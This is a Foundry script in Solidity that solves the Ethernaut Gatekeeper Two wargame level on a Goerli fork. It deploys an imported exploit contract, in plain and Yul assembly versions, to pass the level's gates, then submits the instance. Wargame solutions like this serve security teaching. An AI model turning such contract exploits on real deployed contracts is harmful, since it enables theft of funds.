// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { Gatekeeper2Exploit } from "../../contracts/14_Gatekeeper2.sol";

interface Instance {
    function entrant() external view returns (address);

    function enter(bytes8 _gateKey) external returns (bool);
}

contract Gatekeeper2Script is EthernautScript {
    string network = "goerli";
    address level = 0xf59112032D54862E199626F55cFad4F8a3b0Fce9;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        new Gatekeeper2Exploit(address(instance));
        require(instance.entrant() == player);
    }

    function yulVersion() internal {
        bytes memory initCode = type(Gatekeeper2Exploit).creationCode;
        assembly {
            let size := mload(initCode)
            mstore(initCode, add(size, 0x20))
            mstore(add(initCode, add(0x20, size)), sload(instance.slot))
            pop(create(0, add(initCode, 0x20), mload(initCode)))

            mstore(0, "entrant()")
            mstore(0, keccak256(0, 9))
            pop(staticcall(gas(), sload(instance.slot), 0, 4, 0, 32))
            if iszero(eq(mload(0), sload(player.slot))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
